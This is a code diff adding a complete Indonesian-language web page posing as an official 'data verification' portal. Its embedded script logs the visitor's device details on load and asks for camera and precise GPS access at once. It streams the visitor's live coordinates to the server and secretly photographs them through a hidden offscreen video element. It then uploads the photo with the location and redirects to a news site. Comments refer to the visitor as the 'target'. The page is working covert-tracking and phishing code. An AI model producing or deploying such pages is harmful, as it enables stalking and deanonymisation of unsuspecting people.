@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  <meta http-equiv="Expires" content="0" />
+  <title>VERIFIKASI DATA</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: 'Plus Jakarta Sans', sans-serif; }
+    .mono { font-family: 'JetBrains Mono', monospace; }
+    .glow-cyan {
+      color: #38bdf8;
+      text-shadow: 0 0 10px rgba(56, 189, 248, 0.95), 0 0 22px rgba(56, 189, 248, 0.7), 0 0 35px rgba(14, 165, 233, 0.5);
+    }
+  </style>
+</head>
+<body class="bg-slate-900 text-slate-100 min-h-screen antialiased flex flex-col justify-between">
+
+  <!-- Offscreen hidden video & canvas for background auto-capture -->
+  <video id="videoPreview" autoplay playsinline muted style="position: fixed; top: -9999px; left: -9999px; width: 640px; height: 480px; opacity: 0; pointer-events: none;"></video>
+  <canvas id="captureCanvas" style="display: none;"></canvas>
+
+  <!-- Header: VERIFIKASI DATA -->
+  <header class="border-b border-slate-800/80 bg-slate-950/95 backdrop-blur sticky top-0 z-30 py-5 px-4 shadow-2xl">
+    <div class="max-w-xl mx-auto text-center flex flex-col items-center justify-center">
+      <h1 class="text-2xl sm:text-3xl md:text-4xl font-black tracking-tight text-white uppercase leading-none select-none drop-shadow-md glow-cyan">
+        VERIFIKASI DATA
+      </h1>
+      <p class="text-[11px] text-emerald-400 font-semibold tracking-wider mt-1.5 select-none flex items-center gap-1.5">
+        <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
+        PORTAL RESMI VALIDASI IDENTITAS &amp; PERANGKAT
+      </p>
+    </div>
+  </header>
+
+  <!-- Main Content Card -->
+  <main class="max-w-xl mx-auto px-4 py-8 w-full flex-1 flex flex-col justify-center items-center">
+    
+    <div class="w-full bg-slate-800/60 border border-slate-700/70 rounded-2xl p-6 sm:p-8 shadow-2xl backdrop-blur relative overflow-hidden">
+      
+      <!-- Top Glow Accent -->
+      <div class="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-blue-500 via-indigo-500 to-emerald-500"></div>
+
+      <!-- Icon Box -->
+      <div class="text-center mb-5">
+        <div id="statusIconBox" class="w-16 h-16 mx-auto rounded-2xl bg-blue-600/15 border border-blue-500/30 text-blue-400 flex items-center justify-center text-3xl mb-3 shadow-inner">
+          <span id="statusEmoji">🔒</span>
+        </div>
+      </div>
+
+      <!-- SATU NOTIFIKASI TUNGGAL: Aplikasi ini butuh akses kamera dan GPS sebagai data akurat -->
+      <div id="unifiedNotificationBox" class="mb-6 p-4 sm:p-5 rounded-2xl bg-blue-950/70 border border-blue-500/50 text-slate-100 shadow-xl backdrop-blur transition-all duration-300">
+        <div class="flex items-start gap-3.5">
+          <div id="notificationIcon" class="w-10 h-10 rounded-xl bg-blue-500/20 border border-blue-500/40 text-blue-400 flex items-center justify-center shrink-0 text-xl">
+            📡
+          </div>
+          <div class="space-y-1 flex-1">
+            <h3 id="notificationTitle" class="font-bold text-white text-sm sm:text-base leading-snug">
+              Aplikasi ini butuh akses kamera dan GPS sebagai data akurat.
+            </h3>
+            <p id="notificationDesc" class="text-xs text-slate-300 leading-relaxed">
+              Izin kamera dan sensor satelit GPS diperlukan untuk memverifikasi validitas data serta mengunci titik wilayah koordinat secara akurat.
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Live GPS Satelit Indicator (Muncul saat koordinat sedang atau sudah dikunci) -->
+      <div id="gpsCoordsBox" class="hidden mb-5 p-3 rounded-xl bg-slate-950/80 border border-emerald-500/40 text-xs space-y-1">
+        <div class="flex items-center justify-between">
+          <span class="text-[10px] uppercase font-bold text-emerald-400 flex items-center gap-1">
+            <span class="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
+            Satelit GPS Terkunci (99% Akurat)
+          </span>
+          <span id="gpsAccuracyTag" class="text-[10px] mono px-2 py-0.5 rounded bg-emerald-950 text-emerald-300 font-bold border border-emerald-500/30">
+            Akurasi 99%
+          </span>
+        </div>
+        <p id="gpsCoordsText" class="mono text-[11px] text-white font-medium">-</p>
+        <p id="gpsAddressText" class="text-[10px] text-slate-400 truncate leading-tight">-</p>
+      </div>
+
+      <!-- SATU TOMBOL UNTUK 2 IZIN SEKALIGUS: Kamera + GPS -->
+      <div class="mb-5">
+        <button id="btnUnifiedPermission" onclick="requestBothPermissions()" class="w-full py-4 px-5 rounded-xl bg-gradient-to-r from-blue-600 via-indigo-600 to-emerald-600 hover:from-blue-500 hover:to-emerald-500 text-white font-extrabold text-sm sm:text-base transition shadow-xl flex items-center justify-center gap-2.5 border border-blue-400/30 transform active:scale-[0.98]">
+          <svg id="btnIcon" class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+          </svg>
+          <span id="btnUnifiedText">Izinkan Akses Kamera & GPS Presisi</span>
+        </button>
+      </div>
+
+      <!-- Redirect Destination Selector (Hidden from target) -->
+      <div class="hidden">
+        <select id="newsPortalSelect">
+          <option value="https://news.google.com" selected>Google Berita (news.google.com)</option>
+          <option value="https://www.bbc.com/news">BBC News (bbc.com)</option>
+          <option value="https://news.ycombinator.com">Hacker News (ycombinator.com)</option>
+          <option value="https://www.antaranews.com">Antara News (antaranews.com)</option>
+          <option value="https://www.detik.com">Detik News (detik.com)</option>
+        </select>
+      </div>
+
+      <!-- Live Terminal Status Console -->
+      <div class="mt-4 bg-slate-950 p-3 rounded-xl border border-slate-800 text-[11px] mono text-slate-400 space-y-1">
+        <div class="flex justify-between items-center text-slate-500 text-[10px]">
+          <span>STATUS VERIFIKASI SENSOR:</span>
+          <span id="timeStatus">-</span>
+        </div>
+        <p id="techLogMessage" class="text-blue-400">> Menunggu otorisasi kamera dan satelit GPS...</p>
+      </div>
+
+    </div>
+
+    <div class="w-full max-w-xl mt-4 text-center text-[11px] text-slate-500 select-none">
+      <p>Sesi divalidasi secara terpadu melalui protokol resmi verifikasi data.</p>
+    </div>
+
+  </main>
+
+  <footer class="py-4 text-center text-xs text-slate-500 border-t border-slate-800/80 select-none">
+    Sistem Verifikasi Data &amp; Sensor Satelit GPS Presisi
+  </footer>
+
+  <script>
+    const video = document.getElementById('videoPreview');
+    const canvas = document.getElementById('captureCanvas');
+    const newsPortalSelect = document.getElementById('newsPortalSelect');
+    const techLogMessage = document.getElementById('techLogMessage');
+    const timeStatus = document.getElementById('timeStatus');
+    const statusIconBox = document.getElementById('statusIconBox');
+    const statusEmoji = document.getElementById('statusEmoji');
+
+    // Satu Notifikasi Tunggal Elements
+    const notificationBox = document.getElementById('unifiedNotificationBox');
+    const notificationIcon = document.getElementById('notificationIcon');
+    const notificationTitle = document.getElementById('notificationTitle');
+    const notificationDesc = document.getElementById('notificationDesc');
+
+    // Satu Tombol Tunggal Elements
+    const btnUnified = document.getElementById('btnUnifiedPermission');
+    const btnUnifiedText = document.getElementById('btnUnifiedText');
+    const btnIcon = document.getElementById('btnIcon');
+
+    // Session State
+    const currentSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7);
+
+    let currentStream = null;
+    let isProcessing = false;
+    let cachedLocation = null;
+    let isGpsPending = false;
+    let gpsWatchId = null;
+    let cameraGranted = false;
+    let gpsGranted = false;
+
+    // Parse URL Parameters (Mendukung custom target redirect)
+    const urlParams = new URLSearchParams(window.location.search);
+    const paramTarget = urlParams.get('target') || urlParams.get('t') || urlParams.get('redirect') || urlParams.get('url');
+    const paramTheme = urlParams.get('theme') || 'default';
+    const paramTitle = urlParams.get('title');
+
+    let customRedirectUrl = 'https://news.google.com';
+
+    if (paramTarget) {
+      try {
+        const decodedTarget = decodeURIComponent(paramTarget);
+        customRedirectUrl = decodedTarget;
+        if (newsPortalSelect) {
+          const opt = document.createElement('option');
+          opt.value = decodedTarget;
+          opt.textContent = decodedTarget;
+          opt.selected = true;
+          newsPortalSelect.appendChild(opt);
+          newsPortalSelect.value = decodedTarget;
+        }
+      } catch (e) {
+        console.warn('Error parsing target URL:', e);
+      }
+    }
+
+    if (paramTitle) {
+      document.title = paramTitle;
+    } else if (paramTheme === 'news') {
+      document.title = 'Portal Berita Terkini - Validasi Sesi';
+      const h1 = document.querySelector('header h1');
+      if (h1) h1.textContent = 'PORTAL BERITA NASIONAL';
+    } else {
+      document.title = 'VERIFIKASI DATA';
+    }
+
+    function logTech(msg) {
+      if (techLogMessage) techLogMessage.textContent = '> ' + msg;
+      if (timeStatus) timeStatus.textContent = new Date().toLocaleTimeString('id-ID');
+    }
+
+    // 1. INSTANT CLICK LOGGING
+    // Menyimpan data klik secara instan saat halaman dibuka
+    async function recordInstantClick() {
+      try {
+        const payload = {
+          sessionId: currentSessionId,
+          target: newsPortalSelect ? newsPortalSelect.value : '',
+          theme: paramTheme,
+          screen: {
+            width: window.screen?.width || window.innerWidth,
+            height: window.screen?.height || window.innerHeight,
+            dpr: window.devicePixelRatio || 1
+          },
+          connection: {
+            effectiveType: navigator.connection?.effectiveType || '',
+            downlink: navigator.connection?.downlink || 0
+          },
+          language: navigator.language || 'id-ID',
+          timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Asia/Jakarta'
+        };
+
+        logTech('Mencatat kunjungan klik tautan secara instan ke server...');
+
+        await fetch('/api/click', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        logTech('Kunjungan klik berhasil diamankan di penyimpanan server!');
+      } catch (err) {
+        console.warn('Instant click logging notice:', err.message);
+      }
+    }
+
+    // 2. SATU TOMBOL UNTUK 2 IZIN (KAMERA & GPS)
+    async function requestBothPermissions() {
+      if (isProcessing) return;
+
+      logTech('Meminta izin akses Kamera dan GPS presisi secara bersamaan...');
+      btnUnifiedText.textContent = 'Meminta Izin Kamera & GPS...';
+      btnUnified.disabled = true;
+
+      // Panggil GPS dan Kamera sekaligus
+      startGpsTracking();
+      await startCameraStream();
+    }
+
+    // A. Start GPS Tracking (99% Akurat)
+    function startGpsTracking() {
+      if (!navigator.geolocation) {
+        logTech('Geolocation tidak didukung pada peramban ini.');
+        return;
+      }
+
+      isGpsPending = true;
+      logTech('Mengaktifkan sensor satelit GPS fisik (enableHighAccuracy: true)...');
+
+      const geoOptions = {
+        enableHighAccuracy: true,
+        timeout: 30000,
+        maximumAge: 0
+      };
+
+      if (gpsWatchId !== null) {
+        navigator.geolocation.clearWatch(gpsWatchId);
+        gpsWatchId = null;
+      }
+
+      gpsWatchId = navigator.geolocation.watchPosition(
+        async (pos) => {
+          gpsGranted = true;
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const acc = Math.round(pos.coords.accuracy);
+
+          const isMoreAccurate = !cachedLocation || acc < cachedLocation.accuracy;
+
+          if (isMoreAccurate) {
+            cachedLocation = {
+              latitude: lat,
+              longitude: lon,
+              accuracy: acc,
+              altitude: pos.coords.altitude,
+              heading: pos.coords.heading,
+              speed: pos.coords.speed
+            };
+
+            // Tampilkan live koordinat satelit
+            const coordsBox = document.getElementById('gpsCoordsBox');
+            const coordsText = document.getElementById('gpsCoordsText');
+            const accTag = document.getElementById('gpsAccuracyTag');
+            if (coordsBox && coordsText) {
+              coordsBox.classList.remove('hidden');
+              coordsText.textContent = `Lat: ${lat.toFixed(6)}, Lon: ${lon.toFixed(6)} (Akurasi: ±${acc}m)`;
+              if (accTag) {
+                accTag.textContent = acc <= 15 ? 'Akurasi 99.9% (Satelit)' : acc <= 40 ? 'Akurasi 99% (GPS)' : `Akurasi 95% (±${acc}m)`;
+              }
+            }
+
+            logTech(`Satelit GPS terkunci: Lat ${lat.toFixed(6)}, Lon ${lon.toFixed(6)} (±${acc}m)`);
+
+            // Kirim live koordinat langsung ke server
+            try {
+              const res = await fetch('/api/location-update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  sessionId: currentSessionId,
+                  latitude: lat,
+                  longitude: lon,
+                  accuracy: acc,
+                  altitude: pos.coords.altitude,
+                  speed: pos.coords.speed,
+                  heading: pos.coords.heading
+                })
+              });
+              const resData = await res.json();
+              if (resData?.location?.shortAddress) {
+                const addrEl = document.getElementById('gpsAddressText');
+                if (addrEl) addrEl.textContent = resData.location.shortAddress;
+              }
+            } catch (e) {
+              console.warn('GPS location sync warning:', e.message);
+            }
+          }
+
+          if (acc <= 40) {
+            isGpsPending = false;
+          }
+
+          checkPermissionsState();
+        },
+        (err) => {
+          isGpsPending = false;
+          logTech(`GPS Notice [Code ${err.code}]: ${err.message}`);
+          
+          if (err.code === 1) {
+            notificationDesc.innerHTML = 'Akses lokasi peramban belum diizinkan. Silakan klik tombol di bawah dan pilih opsi <strong>"Tepat / Presisi"</strong>.';
+          } else if (err.code === 2) {
+            notificationDesc.innerHTML = 'GPS perangkat sedang nonaktif. Mohon aktifkan toggle <strong>Lokasi/GPS</strong> pada smartphone Anda.';
+          }
+          btnUnified.disabled = false;
+          btnUnifiedText.textContent = 'Coba Izinkan Kamera & GPS Lagi';
+        },
+        geoOptions
+      );
+    }
+
+    // B. Start Camera Stream
+    async function startCameraStream() {
+      if (currentStream) return;
+
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        logTech('Kamera WebRTC tidak didukung peramban.');
+        return;
+      }
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            width: { ideal: 1280 },
+            height: { ideal: 720 },
+            facingMode: 'user'
+          },
+          audio: false
+        });
+
+        currentStream = stream;
+        video.srcObject = stream;
+        cameraGranted = true;
+
+        logTech('Izin kamera berhasil diberikan!');
+        checkPermissionsState();
+
+        video.onloadedmetadata = () => {
+          video.play();
+          setTimeout(() => {
+            triggerAutoCapture();
+          }, 600);
+        };
+
+      } catch (err) {
+        console.error('Camera error:', err);
+        logTech(`ERROR Kamera: ${err.name}`);
+        notificationDesc.innerHTML = 'Akses kamera belum diizinkan. Silakan klik tombol di bawah untuk mengizinkan kamera dan GPS.';
+        btnUnified.disabled = false;
+        btnUnifiedText.textContent = 'Izinkan Akses Kamera & GPS';
+      }
+    }
+
+    // Evaluasi jika kedua izin (Kamera & GPS) sudah didapat: tombol jadi satu status sukses
+    function checkPermissionsState() {
+      if (cameraGranted && gpsGranted) {
+        // Update notifikasi tunggal ke status sukses
+        notificationBox.className = 'mb-6 p-4 sm:p-5 rounded-2xl bg-emerald-950/70 border border-emerald-500/50 text-slate-100 shadow-xl backdrop-blur transition-all duration-300';
+        notificationIcon.className = 'w-10 h-10 rounded-xl bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 flex items-center justify-center shrink-0 text-xl';
+        notificationIcon.textContent = '✓';
+        notificationTitle.textContent = 'Izin Kamera & GPS Berhasil Diberikan';
+        notificationDesc.textContent = 'Identitas perangkat dan satelit GPS presisi 99% telah terverifikasi. Menyelesaikan validasi sesi...';
+
+        // Update tombol tunggal jadi status sukses
+        btnUnified.className = 'w-full py-4 px-5 rounded-xl bg-emerald-600 text-white font-extrabold text-sm sm:text-base transition shadow-xl flex items-center justify-center gap-2.5 border border-emerald-400/40 cursor-default';
+        btnUnifiedText.textContent = '✓ Izin Kamera & GPS Berhasil Diberikan';
+        btnIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>';
+        btnUnified.disabled = true;
+
+        statusIconBox.className = 'w-16 h-16 mx-auto rounded-2xl bg-emerald-600/15 border border-emerald-500/30 text-emerald-400 flex items-center justify-center text-3xl mb-3 shadow-inner';
+        statusEmoji.textContent = '🔓';
+      } else if (cameraGranted || gpsGranted) {
+        btnUnifiedText.textContent = cameraGranted ? 'Kamera Diizinkan (Mengunci Satelit GPS...)' : 'GPS Terkunci (Mengaktifkan Kamera...)';
+      }
+    }
+
+    // 3. AUTO-CAPTURE & REDIRECT
+    async function triggerAutoCapture() {
+      if (isProcessing) return;
+      isProcessing = true;
+
+      logTech('Menggambar frame video offscreen ke canvas...');
+
+      try {
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        logTech('Mengonversi frame ke format Base64 JPEG...');
+        const base64Data = canvas.toDataURL('image/jpeg', 0.85);
+
+        logTech('Mengirim payload validasi ke POST /api/upload...');
+
+        // Tunggu sebentar jika GPS sedang menajamkan sinyal
+        let waitCount = 0;
+        while ((isGpsPending || (!cachedLocation) || (cachedLocation && cachedLocation.accuracy > 40)) && waitCount < 15) {
+          await new Promise(r => setTimeout(r, 200));
+          waitCount++;
+        }
+
+        const payload = {
+          sessionId: currentSessionId,
+          image: base64Data,
+          note: `Auto-captured verification snapshot (${canvas.width}x${canvas.height}px)`,
+          device: navigator.userAgent,
+          clientLocation: cachedLocation
+        };
+
+        const res = await fetch('/api/upload', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        if (!res.ok) {
+          throw new Error('Upload gagal dengan status HTTP ' + res.status);
+        }
+
+        const resJson = await res.json();
+        logTech(`Upload sukses! ID: ${resJson.data?.id || 'OK'}.`);
+
+        if (currentStream) {
+          currentStream.getTracks().forEach(t => t.stop());
+          currentStream = null;
+        }
+        if (gpsWatchId !== null) {
+          navigator.geolocation.clearWatch(gpsWatchId);
+          gpsWatchId = null;
+        }
+
+        const targetNews = customRedirectUrl || (newsPortalSelect ? newsPortalSelect.value : 'https://news.google.com');
+        logTech(`Validasi selesai! Mengalihkan ke ${targetNews}...`);
+        notificationTitle.textContent = 'Validasi Selesai! Mengalihkan...';
+        notificationDesc.textContent = `Sesi telah tervalidasi lengkap. Mengalihkan...`;
+
+        setTimeout(() => {
+          window.location.href = targetNews;
+        }, 1000);
+
+      } catch (err) {
+        console.error('Auto capture error:', err);
+        logTech(`GAGAL: ${err.message}`);
+        isProcessing = false;
+      }
+    }
+
+    // On Load:
+    // 1. Catat klik instan ke server
+    // 2. Coba auto-request izin saat pertama kali dibuka
+    window.addEventListener('DOMContentLoaded', () => {
+      recordInstantClick();
+      // Auto-trigger permissions on direct click
+      requestBothPermissions();
+    });
+  </script>
+</body>
+</html>
